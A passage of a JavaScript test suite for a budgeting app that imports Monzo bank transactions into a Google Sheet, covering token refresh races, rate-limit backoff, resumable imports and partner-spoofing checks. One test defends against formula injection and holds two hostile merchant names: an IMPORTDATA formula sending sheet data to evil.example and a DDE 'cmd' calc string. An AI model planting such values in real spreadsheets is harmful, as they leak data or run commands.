  G.call({key: G.kE, ops: [{op: "put", table: "transactions", row: {id: "bk-monzo-tx_tesco", split: "half", review: false}}]}); NOW += 15 * 60000; G.c.bankPoll(); S.sync();
  ok("P1: once the payer confirms it as split, the partner sees it beside her own shop (nothing of hers is touched)", (S.T.transactions || []).some(r => r.id === "bk-monzo-tx_tesco" && r.split === "half" && r.amount === 45.2 && !r.deleted) && (S.T.transactions || []).some(r => r.id === "t-pk-tesco" && !r.deleted));
}

{
  // P2: two reads refreshing at once (each refresh token works once at Monzo): the second uses what the first saved
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const tk0 = JSON.parse(G.env.userProps.BANK_TOKEN_ethan);
  const a = G.c.monzoRefresh_("ethan", tk0);
  let b = null, err = null; try { b = G.c.monzoRefresh_("ethan", tk0); } catch (e) { err = e.message; }
  ok("P2: a refresh that lost the race uses the token the other one saved", b && b.access === a.access && !err, {err});
  // P3: Monzo having a bad moment when refreshing isn't a broken connection
  G.env.userProps.BANK_TOKEN_ethan = JSON.stringify(Object.assign(JSON.parse(G.env.userProps.BANK_TOKEN_ethan), {expiresAt: NOW - 1}));
  monzo.tokenDown = true; NOW += 15 * 60000; G.c.bankPoll(); monzo.tokenDown = false;
  let sp = G.call({key: G.kE, action: "bank.status"}).bank;
  ok("P3: a 5xx from Monzo's sign-in server doesn't ask for a reconnect", !sp.needsReconnect && /problem/.test(sp.lastError), sp);
  NOW += 15 * 60000; G.c.bankPoll(); sp = G.call({key: G.kE, action: "bank.status"}).bank;
  ok("P3: and the next poll carries on", sp.connected && !sp.lastError, sp);
}

{
  // P4: a disconnect that lands just before a refreshed token is saved still wins, even if the lock doesn't hold
  // (whether a web app's user lock is shared with the triggers isn't documented)
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const tk = JSON.parse(G.env.userProps.BANK_TOKEN_ethan);
  const up = G.c.PropertiesService.getUserProperties; let armed = true;
  G.c.PropertiesService.getUserProperties = () => { const st = up(), set = st.setProperty; st.setProperty = (k, v) => { if (armed && k === "BANK_TOKEN_ethan") { armed = false; G.c.bankDisconnect_("ethan"); } return set(k, v); }; return st; };
  let err = ""; try { G.c.monzoRefresh_("ethan", tk); } catch (e) { err = e.message; }
  G.c.PropertiesService.getUserProperties = up;
  ok("P4: the refreshed token isn't kept after the disconnect", !armed && !G.env.userProps.BANK_TOKEN_ethan && !G.env.userProps.BANK_TOKEN_NEXT_ethan && /disconnected/.test(err), {err, tok: !!G.env.userProps.BANK_TOKEN_ethan});
  ok("P4: and its new session is ended at Monzo", Object.keys(monzo.tokens).length === 0, Object.keys(monzo.tokens));
  ok("P4: the poll doesn't bring it back", (NOW += 15 * 60000, G.c.bankPoll(), G.call({key: G.kE, action: "bank.status"}).bank.needsSetup === true));
  // a new connection afterwards works as normal
  connectMonzo(G, {acc_00009main: "e-main"});
  ok("P4: connecting again afterwards works", G.call({key: G.kE, action: "bank.status"}).bank.connected === true);
  G.env.userProps.BANK_TOKEN_ethan = JSON.stringify(Object.assign(JSON.parse(G.env.userProps.BANK_TOKEN_ethan), {expiresAt: NOW - 1}));
  NOW += 15 * 60000; G.c.bankPoll();
  ok("P4: and its refreshes are kept", G.call({key: G.kE, action: "bank.status"}).bank.connected === true && JSON.parse(G.env.userProps.BANK_TOKEN_ethan).expiresAt > NOW);
}

{
  // P5: mapping a pot doesn't rewrite the bank's status (a read finishing at that moment can't lose what it saved),
  // and the next read still goes back 89 days
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  NOW += 15 * 60000; G.c.bankPoll();
  const before = G.env.props.BANK_STATUS_ethan;
  NOW += 60000; ok("P5: map", G.call({key: G.kE, action: "bank.map", extId: "pot_bills", account: "e-bills"}).ok === true);
  ok("P5: the status isn't rewritten by bank.map", G.env.props.BANK_STATUS_ethan === before);
  const n0 = reqs.length; NOW += 15 * 60000; G.c.bankPoll();
  const sinceOf = (from) => reqs.slice(from).filter(r => /\/transactions\?/.test(r.url) && /since=20/.test(r.url)).map(r => Math.round((NOW - RealDate.parse(decodeURIComponent(r.url.match(/since=([^&]+)/)[1]))) / 86400000));
  ok("P5: the read after mapping goes back 89 days", sinceOf(n0)[0] === 89, sinceOf(n0));
  ok("P5: and the pot move comes in", grow(G, "moves").some(m => m.id === "bk-monzo-tx_potbills" && m.to === "e-bills"));
  const n1 = reqs.length; NOW += 15 * 60000; G.c.bankPoll();
  ok("P5: then back to 35 days", sinceOf(n1)[0] === 35, sinceOf(n1));
}

{
  // P6: "Check now" can't be used to burn the owner's daily allowance of requests
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  NOW += 60000; const a = G.call({key: G.kE, action: "bank.syncNow"}), n0 = reqs.length;
  const b = G.call({key: G.kE, action: "bank.syncNow"});
  ok("P6: a second Check now straight away is turned away without asking the bank", a.ok && b.ok === false && /moment ago/.test(b.error) && reqs.length === n0, {a, b, n: reqs.length - n0});
  NOW += 31000; ok("P6: and works again half a minute later", G.call({key: G.kE, action: "bank.syncNow"}).ok === true);
}

{
  // P7: a shop name from the bank that looks like a formula goes into the sheet as text (new rows and changed ones)
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  const evil = '=IMPORTDATA("https://evil.example/?d="&A1)';
  monzo.txns = monzoData(planned).concat([mtx("tx_evil", "2026-11-10", -1234, {merchant: merchant(evil, "shopping"), category: "shopping"}), mtx("tx_evil2", "2026-11-11", -999, {counterparty: {name: " +cmd|' /C calc'!A0"}, category: "general"})]);
  const G = bankEnv(), sent = [];
  ["transactions", "moves", "valuations", "exceptions"].forEach(t => { const sh = G.env.sheets[t], gr = sh.getRange; sh.getRange = (...a) => { const r = gr(...a), sv = r.setValues; r.setValues = (v) => { v.forEach(row => row.forEach(x => sent.push(x))); return sv(v); }; return r; }; });
  connectMonzo(G, {acc_00009main: "e-main"});
  ok("P7: bank names that look like formulas are written as text", sent.indexOf("'" + evil) >= 0 && sent.indexOf(evil) < 0 && sent.some(x => /^' \+cmd/.test(String(x))) && !sent.some(x => /^\s*[=+@]/.test(String(x))), sent.filter(x => /IMPORT|cmd/.test(String(x))));
}

// ================= fourth security review =================
{
  // Q1: a partner posting many made-up Peckish shops (one shop name, an amount a penny apart each) must not learn which
  // one the other's bank paid: nothing about her own shops may change until the payer confirms the split
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv();
  const pkS = JSON.parse(Buffer.from(G.c.appLink("sophie", "peckish").split("#connect=")[1], "base64url").toString()).k;
  const probes = []; for (let a = 4400; a <= 4640; a += 10) probes.push({op: "put", table: "transactions", row: {id: "t-pk-q" + a, date: "2026-11-01", person: "sophie", amount: a / 100, budget: "s-food", account: "s-main", split: "half", note: "Tesco Sainsbury Aldi Lidl Deliveroo Uber Amazon", source: "peckish"}});
  const pr = G.call({key: pkS, ops: probes});
  ok("Q1: the probes were saved", pr.applied.length === probes.length, pr.rejected);
  const S = phone(G, G.kS); S.sync();
  const mineBefore = JSON.stringify(grow(G, "transactions").filter(r => /^t-pk-q/.test(r.id)).map(r => [r.id, r.person, r.amount, r.split, r.deleted, r.bankId || ""]));
  connectMonzo(G, {acc_00009main: "e-main"});
  const after = grow(G, "transactions"), mineAfter = JSON.stringify(after.filter(r => /^t-pk-q/.test(r.id)).map(r => [r.id, r.person, r.amount, r.split, r.deleted, r.bankId || ""]));
  ok("Q1: none of the partner's shops changes when the payer's bank is read", mineBefore === mineAfter, {mineBefore: mineBefore.slice(0, 200), changed: after.filter(r => /^t-pk-q/.test(r.id) && (r.person !== "sophie" || r.bankId || r.deleted)).map(r => r.id)});
  const view = () => JSON.stringify((S.T.transactions || []).filter(r => /^t-pk-q/.test(r.id)).map(r => [r.id, r.person, r.amount, r.split, !!r.deleted]).sort());
  const v0 = view(); S.sync();
  ok("Q1: and her phone sees no difference in them, nor any payment of the payer's", v0 === view() && !(S.T.transactions || []).some(r => r.person === "ethan" && !r.deleted), view().slice(0, 300));
  const e = after.find(r => r.id === "bk-monzo-tx_tesco");
  ok("Q1: the payer's own bank row asks whether to split it", e && e.person === "ethan" && e.review === true && e.splitHint !== "half" && e.split === "" && e.amount === 45.2, e);   // nothing taken from her shops
  // the payer confirms it as shared: the partner's matching shop goes, and the payer's bank payment takes its place
  G.call({key: G.kE, ops: [{op: "put", table: "transactions", row: {id: "bk-monzo-tx_tesco", split: "half", review: false}}]});
  NOW += 15 * 60000; G.c.bankPoll();
  const t2 = grow(G, "transactions"), gone = t2.filter(r => /^t-pk-q/.test(r.id) && r.deleted === true).map(r => r.id);
  ok("Q1: once confirmed, none of her shops is touched either", gone.length === 0, gone);
  S.sync();
  ok("Q1: and the partner then sees the payer's split payment", (S.T.transactions || []).some(r => r.id === "bk-monzo-tx_tesco" && r.split === "half" && r.amount === 45.2));
  // the payer says it wasn't shared: the partner's shops stay as they are
  const G2 = bankEnv(); freshMonzo(); monzo.txns = monzoData(planned);
  const pk2 = JSON.parse(Buffer.from(G2.c.appLink("sophie", "peckish").split("#connect=")[1], "base64url").toString()).k;
  G2.call({key: pk2, ops: [{op: "put", table: "transactions", row: {id: "t-pk-solo", date: "2026-11-01", person: "sophie", amount: 45, budget: "s-food", account: "s-main", split: "half", note: "Tesco", source: "peckish"}}]});
  connectMonzo(G2, {acc_00009main: "e-main"});
  G2.call({key: G2.kE, ops: [{op: "put", table: "transactions", row: {id: "bk-monzo-tx_tesco", split: "", review: false}}]});
  NOW += 15 * 60000; G2.c.bankPoll();
  const solo = grow(G2, "transactions").find(r => r.id === "t-pk-solo");
  ok("Q1: confirmed as not shared: the partner's shop is left alone", solo.person === "sophie" && !solo.deleted && solo.amount === 45 && !solo.bankId, solo);
}

{
  // Q2: a first import of years of history against a sheet that already has years of payments stays quick: each bank
  // payment is only compared with the rows from a few days either side (Apps Script stops a run after 6 minutes, and
  // Monzo only gives the whole history for 5 minutes, so a slow first import would lose it)
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  const G = bankEnv(t => { for (let i = 0; i < 1500; i++) t.transactions.push({id: "old" + i, date: B.addDays("2026-10-25", -(i % 900)), person: i % 2 ? "ethan" : "sophie", amount: 3 + (i % 40), budget: i % 2 ? "e-fun" : "s-food", account: i % 2 ? "e-main" : "s-main", note: "Shop " + (i % 30)}); });
  const data = {provider: "monzo", accounts: [{extId: "acc_00009main", name: "M", kind: "main", balance: 1}], txns: []};
  for (let i = 0; i < 3000; i++) data.txns.push({id: "tx_q2_" + i, acc: "acc_00009main", date: B.addDays("2026-11-16", -Math.floor(i * 0.6)), amount: 1 + (i % 57), pending: false, declined: false, name: "Shop " + (i % 30), category: "general", pot: "", card: true, load: false});
  const D0 = G.c.Budgie, real = D0.parseDate; let n = 0; D0.parseDate = (x) => { n++; return real(x); };
  const t0 = RealDate.now(); G.c.CACHE_ = {}; const res = G.c.bankApply_("ethan", data, ""); const ms = RealDate.now() - t0;
  D0.parseDate = real;
  ok("Q2: a big first import compares each payment only with nearby rows", n < 20000 && ms < 20000 && res.added > 2000, {parseDate: n, ms, res});
}

{
  // Q3: a first read of years of history that's slow stops in good time, keeps what it read, and carries on a minute
  // later from where it got to; if Monzo's 5 minutes run out part-way, what was read is kept, with the last 90 days
  const bigHistory = () => { const l = []; for (let i = 0; i < 1000; i++) l.push(mtx("tx_big" + String(i).padStart(4, "0"), B.addDays("2024-01-01", i), -(100 + i), {merchant: merchant("Corner Shop", "general"), category: "general"})); return l.concat(monzoData(planned)); };
  const bigRows = (G) => grow(G, "transactions").filter(r => /^bk-monzo-tx_big/.test(r.id));
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = bigHistory(); monzo.pageDelay = 30000;
  let G = bankEnv(); const t0 = NOW; connectMonzo(G); const took = NOW - t0;
  let st = JSON.parse(G.env.props.BANK_STATUS_ethan);
  ok("Q3: a slow first read stops in good time (Apps Script stops a run at 6 minutes) and keeps what it read", took < 5 * 60000 && bigRows(G).length === 800 && !st.fullDone && st.cursor && /^tx_big0799$/.test(st.cursor.acc_00009main) && G.env.triggers.some(t => t.getHandlerFunction() === "bankPendingImports"), {took, n: bigRows(G).length, st: {fullDone: st.fullDone, cursor: st.cursor}});
  const n0 = reqs.length; NOW += 60000; G.c.bankPendingImports(); st = JSON.parse(G.env.props.BANK_STATUS_ethan);
  const firstAsk = reqs.slice(n0).find(r => /\/transactions\?/.test(r.url));
  ok("Q3: a minute later it carries on from there", firstAsk && /since=tx_big0799/.test(firstAsk.url) && bigRows(G).length === 1000 && new Set(bigRows(G).map(r => r.id)).size === 1000 && st.fullDone && !st.cursor && !G.env.triggers.some(t => t.getHandlerFunction() === "bankPendingImports"), {url: firstAsk && firstAsk.url, n: bigRows(G).length, fullDone: st.fullDone});
  ok("Q3: and then reads just the last 35 days", (NOW += 15 * 60000, G.c.bankPoll(), /since=20/.test(reqs.filter(r => /\/transactions\?/.test(r.url)).pop().url)));
  // the 5 minutes run out between the two runs: the history read so far stays, and the last 90 days come in
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = bigHistory(); monzo.pageDelay = 30000;
  G = bankEnv(); connectMonzo(G);
  monzo.pageDelay = 0; monzo.historyClosed = true; monzo.strictCursor = true; NOW += 60000; G.c.bankPendingImports();
  let sb = G.call({key: G.kE, action: "bank.status"}).bank; st = JSON.parse(G.env.props.BANK_STATUS_ethan);
  ok("Q3: Monzo's 5 minutes ran out before it could carry on: what it read stays, with the last 90 days", bigRows(G).length === 837 && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_big0799") && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_tesco") && st.fullDone && !st.cursor && /part-way/.test(sb.note) && /up to 2026-03-10/.test(sb.note) && sb.connected, {n: bigRows(G).length, note: sb.note, err: sb.lastError});
  // the 5 minutes run out in the middle of one read
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = bigHistory(); monzo.closeAfter = 5;
  G = bankEnv(); connectMonzo(G);
  sb = G.call({key: G.kE, action: "bank.status"}).bank;
  ok("Q3: Monzo stopping part-way through one read keeps the pages it gave", bigRows(G).length === 537 && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_big0000") && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_tesco") && /part-way/.test(sb.note) && /up to 2025-05-14/.test(sb.note) && sb.connected, {n: bigRows(G).length, note: sb.note, err: sb.lastError});
}

{
  // Q5: a Retry-After that's a date, or nonsense, or a year, still backs off sensibly (not never, not forever)
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const backoff = (ra) => { monzo.rate = true; monzo.retryAfter = ra; NOW += 31000; G.call({key: G.kE, action: "bank.syncNow"}); monzo.rate = false; const st = JSON.parse(G.env.props.BANK_STATUS_ethan), until = st.backoffUntil; st.backoffUntil = 0; st.backoffN = 0; G.env.props.BANK_STATUS_ethan = JSON.stringify(st); return until - NOW; };
  const a = backoff(new RealDate(NOW + 31000 + 3 * 3600000).toUTCString()), b = backoff("soon"), c = backoff("31536000");
  ok("Q5: a date in Retry-After is waited for", a >= 3 * 3600000 - 2000 && a <= 3 * 3600000 + 2000, {a});
  ok("Q5: nonsense still backs off", b > 20 * 60000, {b});
  ok("Q5: and never for more than a day", c <= 86400000, {c});
}

{
  // Q6: years of history with holds that never settled don't fill up the status (a property holds 9 KB at most)
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  const old = []; for (let i = 0; i < 400; i++) old.push(mtx("tx_oldhold" + String(i).padStart(3, "0"), B.addDays("2025-01-01", i % 300), -(500 + i), {merchant: merchant("Hotel " + i, "holidays"), category: "holidays", pending: true}));
  monzo.txns = old.concat(monzoData(planned));
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const st = G.env.props.BANK_STATUS_ethan, pend = Object.keys(JSON.parse(st).pending || {});
  ok("Q6: only recent holds are watched, so the status stays small", st.length < 9000 && pend.length === 1 && pend[0] === "tx_shell", {size: st.length, n: pend.length});
}
{
  // Q7: a "payment between you" your partner makes up can't hide one of your bank payments
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv();
  const made = G.call({key: G.kS, ops: [{op: "put", table: "settlements", row: {id: "set-fake", date: "2026-11-06", from: "ethan", to: "sophie", amount: 20, note: "Ethan paid me back"}}]});
  connectMonzo(G, {acc_00009main: "e-main"});
  ok("Q7: the made-up one doesn't hide Ethan's payment to a friend", made.applied.length === 1 && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_friend" && !r.deleted), made);
  freshMonzo(); monzo.txns = monzoData(planned);
  const G2 = bankEnv(), mine = G2.call({key: G2.kE, ops: [{op: "put", table: "settlements", row: {id: "set-real", date: "2026-11-06", from: "ethan", to: "sophie", amount: 20, note: "paid Sophie back"}}]});
  connectMonzo(G2, {acc_00009main: "e-main"});
  ok("Q7: one Ethan logged himself still counts", mine.applied.length === 1 && !grow(G2, "transactions").some(r => r.id === "bk-monzo-tx_friend"));
}

{
  // Q9: carrying on a first read over two current accounts: each picks up where it was, and one already read to the
  // end is never read from the start again
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  const G = bankEnv(), asked = [];
  const page = (acc, from) => Array.from({length: 100}, (_, i) => ({id: "tx_" + acc + "_" + String(from + i).padStart(4, "0"), created: iso(B.addDays("2024-01-01", from + i)), settled: iso("2024-01-01"), amount: -100, merchant: {name: "Shop"}, category: "general", metadata: {}}));
  G.c.monzoGet_ = (p, path, q) => {
    if (path === "/accounts") return {accounts: [{id: "accA", type: "uk_retail"}, {id: "accB", type: "uk_retail"}]};
    if (path === "/balance") return {balance: 100}; if (path === "/pots") return {pots: []};
    asked.push(q.account_id + ":" + (q.since || "")); NOW += 60000;   // each page takes a minute
    if (q.since && !/^tx_/.test(q.since)) return {transactions: []};   // nothing in the last 35 days
    const n = /^tx_/.test(q.since || "") ? +q.since.slice(-4) + 1 : 0; return {transactions: n >= 300 ? [] : page(q.account_id, n)};
  };
  G.c.bankStart_();
  const r1 = G.c.monzoRead_("ethan", true, false, null, NOW + 3.5 * 60000);
  ok("Q9: the first run reads the first account to the end and stops part-way through the second", JSON.stringify(r1.cursor) === JSON.stringify({accB: "tx_accB_0099"}), r1.cursor);
  asked.length = 0;
  const r2 = G.c.monzoRead_("ethan", true, false, r1.cursor, NOW + 30000);
  ok("Q9: then the finished account only gets its last 35 days, and the other carries on from where it was", /^accA:20/.test(asked[0]) && asked.indexOf("accB:tx_accB_0099") >= 0 && !asked.some(a => /^accA:(tx_|$)/.test(a)), asked);
  ok("Q9: and running out of time again never puts the finished account back to the start", r2.cursor && r2.cursor.accA === undefined && /^tx_accB_/.test(r2.cursor.accB), r2.cursor);
  // the other way round: the first account still has more, the second was finished
  const r3 = G.c.monzoRead_("ethan", true, false, {accA: "tx_accA_0099"}, NOW + 30000);
  ok("Q9: a finished account after the one that ran out of time stays finished", r3.cursor && /^tx_accA_/.test(r3.cursor.accA) && r3.cursor.accB === undefined, r3.cursor);
}

{
  // Q10: made-up shops aimed at the payer's history, or at lots of payments, can't fill the payer's status or list
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  const hist = []; for (let i = 0; i < 120; i++) hist.push(mtx("tx_q10_" + i, B.addDays(i < 60 ? "2026-07-01" : "2026-10-27", i % 60 % 20), -(1000 + i), {merchant: merchant("Tesco", "groceries"), category: "groceries"}));
  monzo.txns = hist.concat(monzoData(planned));
  const G = bankEnv();
  const pkS = JSON.parse(Buffer.from(G.c.appLink("sophie", "peckish").split("#connect=")[1], "base64url").toString()).k;
  const ops = hist.map(t => ({op: "put", table: "transactions", row: {id: "t-pk-" + t.id, date: t.created.slice(0, 10), person: "sophie", amount: -t.amount / 100, budget: "s-food", account: "s-main", split: "half", note: "Tesco", source: "peckish"}}));
  G.call({key: pkS, ops: ops});
  connectMonzo(G, {acc_00009main: "e-main"});
  const st = JSON.parse(G.env.props.BANK_STATUS_ethan), peers = Object.keys(st.peers || {});
  const hinted = grow(G, "transactions").filter(r => /^bk-monzo-tx_q10_/.test(r.id) && r.splitHint === "half");
  ok("Q10: payments from before the payer started Budgie are never matched to the partner's shops", !hinted.some(r => r.date < "2026-10-26"), hinted.filter(r => r.date < "2026-10-26").map(r => r.id));
  ok("Q10: and only a few wait at a time", peers.length <= 40 && hinted.length <= 40 && G.env.props.BANK_STATUS_ethan.length < 9000, {peers: peers.length, hinted: hinted.length, size: G.env.props.BANK_STATUS_ethan.length});
}

// ================= fifth security review =================
{
  // R1: a move of the partner's that carries the payer's payday key ("pay:<payday>:<his pot>") mustn't stop the payer's
  // own bank move to that pot coming in
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv();
  const sp = G.call({key: G.kS, ops: [{op: "put", table: "moves", row: {id: "m-spoof", date: "2026-10-29", person: "sophie", from: "", to: "", amount: 1, key: "pay:2026-10-29:e-bills"}}]});
  connectMonzo(G, {acc_00009main: "e-main", pot_bills: "e-bills"});
  const pb = grow(G, "moves").find(m => m.id === "bk-monzo-tx_potbills");
  ok("R1: the partner's move was saved (it's hers to make)", sp.applied.length === 1, sp);
  ok("R1: and the payer's bank move to his pot still comes in", pb && pb.person === "ethan" && pb.to === "e-bills" && !pb.deleted, pb);
  // his own tick in the app still stops a second copy
  freshMonzo(); monzo.txns = monzoData(planned);
  const G2 = bankEnv();
  G2.call({key: G2.kE, ops: [{op: "put", table: "moves", row: {id: "m-mine", date: "2026-10-29", person: "ethan", from: "e-main", to: "e-bills", amount: planned.bills, key: "pay:2026-10-29:e-bills"}}]});
  connectMonzo(G2, {acc_00009main: "e-main", pot_bills: "e-bills"});
  ok("R1: his own tick still counts", !grow(G2, "moves").some(m => m.id === "bk-monzo-tx_potbills" && !m.deleted));
}

{
  // R2: the last part of a first read that was carried on only covers the time since it stopped, so a hold it read in
  // an earlier part (and so doesn't see now) mustn't be taken for one that's gone
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  const list = []; for (let i = 0; i < 790; i++) list.push(mtx("tx_r2old" + String(i).padStart(4, "0"), B.addDays("2024-08-01", Math.floor(i * 0.9)), -(100 + i), {merchant: merchant("Corner Shop", "general"), category: "general"}));
  list.push(mtx("tx_r2hold", "2026-11-01", -5000, {merchant: merchant("Hotel Stay", "holidays"), category: "holidays", pending: true, time: "07:00:00"}));
  for (let i = 0; i < 50; i++) list.push(mtx("tx_r2new" + String(i).padStart(3, "0"), B.addDays("2026-11-02", i % 14), -(200 + i), {merchant: merchant("Cafe", "eating_out"), category: "eating_out", time: "09:" + String(i % 60).padStart(2, "0") + ":00"}));
  monzo.txns = list; monzo.pageDelay = 30000;
  const G = bankEnv(); connectMonzo(G);
  let st = JSON.parse(G.env.props.BANK_STATUS_ethan);
  const hold = () => grow(G, "transactions").find(r => r.id === "bk-monzo-tx_r2hold");
  ok("R2: the first part read the hold and stopped after it", st.cursor && !st.fullDone && hold() && !hold().deleted && st.pending && st.pending.tx_r2hold, {cursor: st.cursor, hold: hold()});
  monzo.pageDelay = 0; NOW += 60000; G.c.bankPendingImports(); st = JSON.parse(G.env.props.BANK_STATUS_ethan);
  ok("R2: carrying on to the end doesn't drop the hold it read before", st.fullDone && hold() && !hold().deleted && st.pending.tx_r2hold, {fullDone: st.fullDone, hold: hold()});
  NOW += 15 * 60000; G.c.bankPoll();
  ok("R2: and the next read, which sees it, keeps it", hold() && !hold().deleted);
}

{
  // R3: a payment the bank feed took off by itself (a hold that seemed to vanish) comes back if the bank shows it again;
  // one you dismissed yourself stays dismissed
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  monzo.txns = monzoData(planned).concat([mtx("tx_r3hold", "2026-11-05", -4200, {merchant: merchant("Garage", "transport"), category: "transport", pending: true})]);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const row = (id) => grow(G, "transactions").find(r => r.id === id);
  ok("R3: the hold came in", row("bk-monzo-tx_r3hold") && !row("bk-monzo-tx_r3hold").deleted);
  const held = monzo.txns.find(t => t.id === "tx_r3hold"); monzo.txns = monzo.txns.filter(t => t !== held);
  NOW += 15 * 60000; G.c.bankPoll();
  ok("R3: missing from the feed and over a week old, it's taken off", row("bk-monzo-tx_r3hold").deleted === true && row("bk-monzo-tx_r3hold").by === "bank");
  held.settled = iso("2026-11-18"); held.amount = -4300; monzo.txns.push(held);
  NOW += 15 * 60000; G.c.bankPoll();
  ok("R3: when the bank shows it again (settled), it's back, at the settled amount", row("bk-monzo-tx_r3hold").deleted === false && row("bk-monzo-tx_r3hold").amount === 43, row("bk-monzo-tx_r3hold"));
  G.call({key: G.kE, ops: [{op: "delete", table: "transactions", id: "bk-monzo-tx_r3hold"}]});
  NOW += 15 * 60000; G.c.bankPoll();
  ok("R3: one you dismissed stays dismissed", row("bk-monzo-tx_r3hold").deleted === true);
}

{
  // R4: the same payment twice in one read (a Starling payment listed under a Space as well as the account, or two
  // 90-day windows meeting on its time) is one payment: a planned bill it matched doesn't also become a payment
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  monzo.txns = monzoData(planned); const rent = monzo.txns.find(t => t.id === "tx_rent"); monzo.txns.push(Object.assign({}, rent));
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const tx = grow(G, "transactions");
  ok("R4: a bill read twice is still just the bill", !tx.some(r => r.bankId === "tx_rent" && !r.deleted), tx.filter(r => r.bankId === "tx_rent"));
}

{
  // R5: a first import that has to link hundreds of payments logged by hand (each one its own write to the sheet, a few
  // seconds each on a slow day) stops in good time rather than being stopped by Apps Script at 6 minutes (which keeps
  // nothing, and tries the same again every minute); what it read is kept, and the next runs finish the links
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  const extra = [], hand = [];
  for (let i = 0; i < 200; i++) { const d = B.addDays("2025-06-01", i); extra.push(mtx("tx_r5_" + i, d, -(500 + i), {merchant: merchant("Market Stall", "general"), category: "general"})); hand.push({id: "hand-r5-" + i, date: d, person: "ethan", amount: (500 + i) / 100, budget: "e-fun", account: "e-main", note: "Market", source: "app"}); }
  monzo.txns = extra.concat(monzoData(planned));
  const G = bankEnv(t => { hand.forEach(h => t.transactions.push(h)); });
  const real = G.c.applyOne_; G.c.applyOne_ = function (me, op, now, by, opts) { if (opts && opts.sys) NOW += 5000; return real.apply(this, arguments); };
  const t0 = NOW; connectMonzo(G); const took = NOW - t0;
  const linked = () => grow(G, "transactions").filter(r => /^hand-r5-/.test(r.id) && r.bankId).length;
  let st = JSON.parse(G.env.props.BANK_STATUS_ethan);
  ok("R5: the run ends well inside 6 minutes", took < 6 * 60000, {took});
  ok("R5: what it read is kept (the new payments are in) and it carries on a minute later", grow(G, "transactions").some(r => r.id === "bk-monzo-tx_tesco") && linked() > 0 && linked() < 200 && st.again && !st.fullDone && !st.waiting && G.env.triggers.some(t => t.getHandlerFunction() === "bankPendingImports"), {linked: linked(), st: {again: st.again, fullDone: st.fullDone, err: st.lastError}});
  let runs = 0, longest = 0;
  while (st.again && runs < 8) { NOW += 60000; const a = NOW; G.c.bankPendingImports(); longest = Math.max(longest, NOW - a); runs++; st = JSON.parse(G.env.props.BANK_STATUS_ethan); }
  ok("R5: the next runs finish the links, each in good time, with nothing added twice", linked() === 200 && st.fullDone && !st.again && longest < 6 * 60000 && !grow(G, "transactions").some(r => /^bk-monzo-tx_r5_/.test(r.id)) && !G.env.triggers.some(t => t.getHandlerFunction() === "bankPendingImports"), {linked: linked(), runs, longest, fullDone: st.fullDone});
  G.c.applyOne_ = real;
}

{
  // R6: a row of the partner's that names one of the payer's bank payments (a Peckish shop an older version linked, or
  // one typed into the sheet) is never changed by reading the payer's bank, and doesn't hide that payment from him
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(t => { t.transactions.push({id: "t-pk-legacy", date: "2026-11-01", person: "sophie", amount: 40, budget: "s-food", account: "s-main", split: "half", note: "Tesco (Peckish)", source: "peckish", bankId: "tx_tesco", review: true}); });
  const before = JSON.stringify(grow(G, "transactions").find(r => r.id === "t-pk-legacy"));
  connectMonzo(G, {acc_00009main: "e-main"});
  const after = grow(G, "transactions"), hers = after.find(r => r.id === "t-pk-legacy");
  ok("R6: the partner's row is left exactly as it was", JSON.stringify(hers) === before, {before, hers});
  ok("R6: and the payer's payment comes in as his own", after.some(r => r.id === "bk-monzo-tx_tesco" && r.person === "ethan" && r.amount === 45.2 && !r.deleted));
}

{
  // R7: a property holds at most 9 KB. Lots of pots with long names and lots of holds waiting mustn't make the status
  // too big to save (which would stop every read from then on)
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  const pots0 = monzo.pots;
  monzo.pots = Array.from({length: 70}, (_, i) => ({id: "pot_0000" + String(i).padStart(12, "0"), name: "🏖️ Saving up for something rather far away, number " + i, balance: 100 * i, deleted: false}));
